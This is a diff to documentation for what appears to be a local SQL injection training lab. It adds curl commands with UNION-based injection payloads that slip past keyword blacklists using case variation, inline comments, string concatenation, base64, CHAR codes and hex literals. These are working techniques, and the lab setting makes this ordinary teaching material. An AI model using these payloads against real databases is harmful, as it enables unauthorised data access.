@@ -59,10 +59,65 @@ curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(SELECT 
 curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select @@version) -- " -d blacklistconfig=alllowercase
 ```
 
-##### All uppercase
+##### All Uppercase
 
 ```
 curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklistconfig=alluppercase
+```
+
+##### Keyword Combination Check
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union/**/select null,null,(select @@Version) -- " -d blacklistconfig=keyworddetection
+```
+
+##### String Detection I
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CONCAT('VERSIO','N')) --
+```
+
+or
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name='VERSIO' 'N')
+```
+
+
+##### String Detection II
+
+Using
+
+```
+echo -n 'VERSION'|base64
+```
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=FROM_BASE64('VkVSU0lPTg==')) -- "
+```
+
+##### String Detection III
+
+Using
+
+```
+printf '%d %d %d %d %d %d %d' "'V" "'E" "'R" "'S" "'I" "'O" "'N"
+```
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CHAR(86,69,82,83,73,79,78)) -- "
+```
+
+##### String Detection IV  
+
+Using
+
+```
+SELECT CONCAT('0x',HEX('VERSION'))
+``` 
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494F4E) -- "
 ```
 
 ##### All together
